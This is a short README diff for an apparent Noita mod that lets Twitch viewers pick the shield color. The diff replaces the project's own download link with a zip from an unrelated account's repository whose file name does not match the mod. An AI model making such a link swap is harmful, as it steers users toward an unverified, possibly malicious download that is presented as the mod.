@@ -2,7 +2,7 @@
 
 This mod lets Twitch viewers redeem a channel point reward that changes your shield color by shifting magical liquid to a chosen material.
 
-**Download:** [Zip File](https://github.com/pyritestandard/Noita_Mod-Twitch_Chooses_Shield_Color/releases/download/Noita/Twitch.Picks.Shield.Color.zip)
+**Download:** [Zip File](https://github.com/Mamumimi/NoitaChatSoundsForTwitchExtended/releases/download/v1.0.0/twitch_extended_chat_ping_sound.zip)
 
 ## Requirements
 
